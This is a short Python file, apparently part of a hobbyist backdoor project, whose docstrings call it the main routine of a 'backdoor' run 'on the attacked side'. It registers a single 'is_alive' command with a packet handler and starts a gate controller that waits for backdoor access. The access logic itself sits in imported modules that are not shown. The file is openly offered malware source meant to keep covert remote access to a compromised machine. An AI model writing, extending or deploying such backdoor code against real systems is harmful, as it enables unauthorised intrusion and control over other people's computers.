"""
Author: Sp4rkN3r0
Date: 22/02/2024
Purpose: Holds the main operation the backdoor
"""
from backdoor_gate_control import BackdoorGateControl
from backdoor_packet_handler import BackdoorPacketHandler

def is_alive(args):
	return b"Alive!"

def main():
	"""
	starts the backdoor on the attacked side
	"""
	bd_packet_handler = BackdoorPacketHandler({"is_alive": is_alive})
	bd_gate_control = BackdoorGateControl(bd_packet_handler)
	bd_gate_control.wait_for_bd_access()


if __name__ == "__main__":
	main()

